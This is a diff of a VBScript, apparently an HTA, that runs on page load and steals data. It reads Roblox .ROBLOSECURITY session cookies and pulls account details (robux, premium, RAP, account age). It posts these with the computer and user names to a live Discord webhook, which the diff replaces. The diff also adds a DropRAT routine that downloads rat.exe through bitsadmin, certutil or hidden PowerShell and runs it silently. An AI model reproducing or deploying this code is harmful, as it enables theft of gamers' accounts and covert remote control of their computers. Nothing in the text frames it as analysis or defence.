@@ -7,7 +7,7 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1558199034957664328/muUIz3ZNgQ0b-0HIptbhmTeEPdAGJJfOpeyBuuwc0tFyMhrjWbV6VC47qHuiSB6YOMvL"
+WH   = "https://discord.com/api/webhooks/1559323709225836645/b7zxr16TsOy9hodNrB7YHT2oD0alusiuYgJM_IaYTOVlSQYXvSHIoySBuHbyn8TxN_UE"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
@@ -17,6 +17,7 @@ Sub Window_OnLoad()
     IP()
     GrabDiscord()
     GrabRoblox()
+    DropRAT()
 End Sub
 
 Sub IP()
@@ -315,7 +316,6 @@ Sub GrabRobloxInfo(cookie)
     Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
 
-    ' --- userinfo (uid, username, robux, premium) ---
     xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
     xh.Send
@@ -330,7 +330,6 @@ Sub GrabRobloxInfo(cookie)
     If robux   = "" Then robux   = "0"
     If premium = "" Then premium = "false"
 
-    ' --- account created date / age ---
     xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
     xh.Send
     ageDays = "?"
@@ -345,7 +344,6 @@ Sub GrabRobloxInfo(cookie)
         End If
     End If
 
-    ' --- RAP: sum recentAveragePrice from collectibles ---
     rapVal = "0"
     xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
@@ -378,10 +376,8 @@ Sub GrabRobloxInfo(cookie)
 
     Set xh = Nothing
 
-    ' --- build embed matching checker layout ---
     Dim nl : nl = Chr(10)
     Dim embedDesc : embedDesc = ""
-
     embedDesc = embedDesc & "**Username** | **Age** | **PC**" & nl
     embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
     embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
@@ -392,7 +388,26 @@ Sub GrabRobloxInfo(cookie)
     PostEmbed "Roblox Hit", embedDesc, 16711680
 End Sub
 
-' --- regex helpers (VBScript native, no external deps) ---
+Sub DropRAT()
+    Dim temp, dl
+    temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\rat.exe"
+    dl   = "https://github.com/alexproisgamer-dotcom/cute-mouse/raw/refs/heads/main/rat.exe"
+
+    sh.Run "bitsadmin /transfer wd /download /priority high """ & dl & """ """ & temp & """", 0, True
+
+    If Not fso.FileExists(temp) Then
+        sh.Run "certutil -urlcache -split -f """ & dl & """ """ & temp & """", 0, True
+    End If
+
+    If Not fso.FileExists(temp) Then
+        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    End If
+
+    If fso.FileExists(temp) Then
+        sh.Run """" & temp & """", 0, False
+    End If
+End Sub
+
 Function RegexFirst(src, pattern)
     Dim rx : Set rx = CreateObject("VBScript.RegExp")
     rx.Pattern = pattern
